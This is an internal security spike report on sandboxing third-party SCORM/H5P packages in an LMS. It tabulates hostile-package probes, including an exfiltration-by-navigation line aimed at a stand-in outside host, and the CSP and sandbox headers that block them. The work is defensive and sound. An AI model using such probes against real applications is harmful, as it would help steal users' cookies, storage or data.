# M4b spike: hosting untrusted SCORM / H5P content (S1–S4, S9)

Status: **spike result, draft for review** (QA2 security review requested). Author: Backend developer 4, for plan PR #427 (Task 2).
Prototype: branch `spike/m4b-package-host` (updated for the QA3 review at 4f52c1de; `spike/m4b-package-host/`, throwaway, not in `LMS.slnx`, never merged). No production code in this PR.

## Question
Can package content (zips of third-party JavaScript) run in the browser without being able to read app cookies or storage, call the app API as the user, navigate the app, or reach the network, and still report completion and score? Which headers make that true?

## Method
One ASP.NET process answers on two origins (`http://app.localhost:5101` = the app, `http://content.localhost:5102` = the package host; `*.localhost` resolves to loopback, so no hosts file). The app page stores a cookie and a localStorage secret, embeds the package host's launch page in an `iframe sandbox="allow-scripts"`, and hands it a private `MessageChannel` port. The "hostile package" runs 20 probes (cookie, storage, parent access, top navigation, popups, credentialed fetch to the app, fetch/XHR/image/form to the outside, own-frame navigation with data, inline handlers, `eval`, forged messages, identity reads, abusive commits); the probe also opens the package URL as a top-level page and counts requests that reach the outside, with header variants (`?csp=eval`, `?hdr=nofs`, `?hdr=nosandbox`) that show what each header is worth. `spike/m4b-package-host/probe` drives it with headless Chromium (Playwright) and prints the result. Reproduce: `dotnet run --project spike/m4b-package-host` then `dotnet run --project spike/m4b-package-host/probe`.

## Results (Chromium, both CSP variants)
| Probe from inside the package | Result |
|---|---|
| `document.cookie`, `localStorage`, `sessionStorage`, `indexedDB` | blocked (`SecurityError`: opaque origin) |
| `parent.document`, `top.location = app` | blocked (`SecurityError`); app URL unchanged afterwards |
| `window.open` | blocked (no `allow-popups`): returns null |
| form submit to outside | the call does not throw (`submitted?`); the evidence is that no request reached the outside and no frame navigated (`allow-forms` off, `form-action 'none'`) |
| `fetch(app /secret, credentials: include)` | blocked by CSP `connect-src 'none'` (the violation report shows it; this probe does not separate that from CORS, so the "cookie never sent" claim rests on F2(b), not on this row) |
| fetch / XHR / image beacon to the outside or to its own host | blocked by `connect-src 'none'` / `img-src 'self' data: blob:` |
| `eval()`, `new Function()` | **blocked with strict CSP**, allowed only when `'unsafe-eval'` is added (never network) |
| inline script and inline event handlers (`onerror=` via `innerHTML`) | run (probed; needed by real content; `script-src 'unsafe-inline'`) |
| own frame `location.href = outside?leak=1` | **blocked only by the app page's `frame-src <package origin>`**: frame goes to `chrome-error`, 0 requests reach the outside. With `frame-src` removed (demo variant) the request with the data **is sent** (see F1) |
| `LMSGetValue('cmi.core.student_name')` | returns an opaque value (`learner`), never the real name (F3) |
| package URL opened as a **top-level page** | with the CSP `sandbox` directive: opaque origin, `localStorage`/`document.cookie` throw `SecurityError`. Without it (demo variant): real origin, **`localStorage` works** (see F1) |
| forged `parent.postMessage({type:'scorm.commit',…}, '*')` | reaches the window, **ignored** (only the private port is trusted) |
| legit commit through the port | accepted, forwarded by the app page to `/track` |
| commit with a key not on the allow-list / value > 4 KB / unknown type / more than 10 per 10 s | rejected by the app page |

## Findings
**F1. Headers that work.** App host (unchanged from today): `X-Frame-Options: DENY`, `frame-ancestors 'none'`, plus **`frame-src <package origin>`** (new). Package host, on every response:
`Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline' [+ 'unsafe-eval' only if proven needed]; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; font-src 'self' data:; connect-src 'none'; frame-src 'none'; form-action 'none'; base-uri 'none'; frame-ancestors <app origin>; sandbox allow-scripts`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Cache-Control: private, no-store`, **no `X-Frame-Options`** (it would forbid the embed), **no `Set-Cookie` ever**, content types assigned by the server from an extension allow-list. `SecurityHeadersMiddleware` therefore needs a per-host policy (app vs package host); the package host should be a separate pipeline or a host-matched branch, not a flag in the shared middleware.

**F1a. The `sandbox` CSP directive is required (QA3 review, prototyped).** The iframe attribute only protects the embedded case. Opened as a top-level page (a token leaked through a log or `Referer`, or a lured user; `frame-ancestors` does not stop top-level navigation) the package URL runs at the real origin `content.localhost`: probe result **`localStorage` WORKS**. With `sandbox allow-scripts` in the package-host CSP header the same top-level load gets an opaque origin and `localStorage` / `document.cookie` throw `SecurityError`. This also closes the cookie-tossing path from a sibling sub-domain (F2's fallback) because the page can no longer touch cookies; **not demonstrated** (the probe's `Domain=` write is rejected by the browser for `localhost`, so a real parent-domain test needs the real DNS layout). Additionally rejecting requests whose `Sec-Fetch-Dest` is not `iframe` is a cheap second layer, not prototyped.

**F1b. `frame-src` on every app page that embeds a package is load-bearing.** `connect-src 'none'` does not cover navigation. A package that sets `location.href = 'http://outside/?data'` (own frame) is stopped only by the embedding page's `frame-src <package origin>`: measured **0 requests to the outside with it, 1 request carrying the query with it removed** (demo variant `?hdr=nofs`). Every page that embeds a package must send `frame-src <package origin>` (not only `frame-ancestors` on the package side); add a test that asserts the header on those pages. `<meta http-equiv=refresh>` takes the same navigation path but was not probed separately.

**F2. Two independent walls.** (a) the iframe `sandbox="allow-scripts"` (no `allow-same-origin`) gives the document an opaque origin: no cookies, storage, parent access, top navigation, popups, forms; (b) the separate host name keeps app cookies from being sent to it at all. Requirement for (b): app cookies must be **host-only** (no `Domain=` attribute); a `Domain=example.com` cookie would be sent to `content.example.com`. The package host must not share a registrable-domain cookie jar assumption: use a different site if the owner can (best), else a sibling sub-domain with host-only app cookies.

**F3. `postMessage` pattern that is safe.** (1) The app never trusts window-level messages (`message` listener only counts and drops). (2) After the iframe `load`, the app creates a `MessageChannel` and transfers **one port** to `frame.contentWindow` (`targetOrigin '*'` is unavoidable with an opaque origin; the target is pinned by `contentWindow`). (3) All commits travel on that port; the app validates shape, size (8 KB message, 4 KB value), a **key allow-list**, and rate; (4) the app page, not the package, makes the authenticated call to the server (the package holds no token or cookie). (5) **No learner identity or PII ever reaches the shim**: writes of `cmi.core.student_name` are rejected, and reads (`LMSGetValue('cmi.core.student_name' / 'student_id')`) return an opaque constant (prototyped). Tests: forged window message ignored; student-name key, oversized value, unknown type and the 11th commit rejected. The client-side limits are a UX guard only: the **server must enforce the same key allow-list, size and rate per token** (and per attempt), because a compromised app page is out of scope but a bug in the validator is not.

**F4. Commits are unordered.** Parallel `fetch` calls reached the server in a different order than sent (scores `0,2,1,3…`). Commits must carry a client sequence number (or the server must take last-write by sequence), and `LMSFinish` must be a flush barrier.

**F5. Token (S9) works as a path token, no cookies.** `/p/{token}/…`, token = `base64url(json{package, student, exp}).HMAC-SHA256`, verified in constant time; forged, expired and malformed tokens give one identical 404; relative URLs inside the package keep working because the token is a path prefix. Revocation (module hidden, student unenrolled) is bounded by the **token lifetime** (proposal 10 minutes) plus a launch endpoint that re-checks access and re-issues; per-request DB checks are avoidable. Tokens in paths can leak through logs and `Referer`: `Referrer-Policy: no-referrer` and log redaction of `/p/*` are required.

**F6. SCORM API discovery vs the sandbox (important).** SCORM 1.2/2004 content finds `API` / `API_1484_11` by walking `window.parent` synchronously. With an opaque-origin sandbox that walk is a cross-origin access and **fails**. The prototype avoids it by injecting the shim into the launch document itself (`window.API` on the same window, committing over the private port), which works for single-document SCOs (the v1 scope, S5). Packages whose launch page is a frameset or nests the SCO in a child frame that looks in `parent` will not find the API. Options: reject such packages at validation (v1), or fall back to a **per-launch sub-domain** (`{launch}.content.example.com`, no sandbox attribute, its own origin per launch, wildcard TLS) which allows a same-origin wrapper frame. Not prototyped; needs an owner decision and the real-package corpus.

## Answers to the plan's spike questions
- **S1 origin layout:** separate host name, cookie-less, + sandbox. DNS/TLS/ingress is an infrastructure task (Lead/owner). Dev/CI: `app.localhost` / `content.localhost` work in Chromium with no setup and in headless Playwright (verified); other browsers not tested.
- **S2 sandbox flags:** `allow-scripts` alone sufficed for the probe and the shim. `allow-forms`, `allow-popups`, `allow-same-origin`, `allow-top-navigation`, `allow-modals` stay off. *Not verified against real packages* (no corpus in the repo).
- **S3 CSP vs real content:** strict CSP blocks `eval`/`new Function`; if the corpus shows real packages need them, add `'unsafe-eval'` for the package host only (it never grants network, and `connect-src 'none'` + sandbox still hold). Policy proposal: reject at upload only when the content needs something outside this policy; never relax `connect-src`. *Open: three real SCORM and two H5P files.*
- **S4 transport:** MessagePort pattern above; `sendBeacon` is blocked by `connect-src 'none'` by design, so the **app page** flushes on `pagehide` from the last port state. Rate limits to be set from real traffic.
- **S5–S8** (SCORM scope, zip limits, malware, H5P player): **not prototyped.** Recommendations stand as in the plan (single-SCO only, streamed extraction with real-byte counting and the proposed caps, vendored h5p-standalone); the crafted-archive corpus (zip-slip, bombs, symlinks, polyglots) and the antivirus decision (ClamAV as a pluggable scan step, owner call) remain for the Task 6 security checklist.
- **S9 tokens:** see F5; bind to package + student (+ attempt id when attempts exist), 10-minute lifetime, reusable within the lifetime, re-issued by an authorised launch endpoint.

## Decisions needed
1. Owner/infra: a second site (or at least a sibling sub-domain) for package content in every environment; wildcard TLS only if the per-launch sub-domain fallback (F6) is chosen.
2. Lead/BE: per-host header policy in the middleware (F1) and host-only app cookies (F2).
3. QA/BE next: run the real-package corpus (S2/S3/F6) and the crafted-archive corpus (S6) before Tasks 6–8 are sized.

## Decisions needed (added by the QA3 review)
4. BE (Tasks 6/7): put `sandbox allow-scripts` in the package-host CSP and assert it in a test; assert `frame-src <package origin>` on every embedding page.

## Limits of this spike
Chromium only; one hostile page written by us, not a real adversary corpus; no real SCORM/H5P content; single process on loopback (no TLS, no real DNS, no CDN); the server-side enforcement (F3), the launch endpoint and the extraction job are design only.
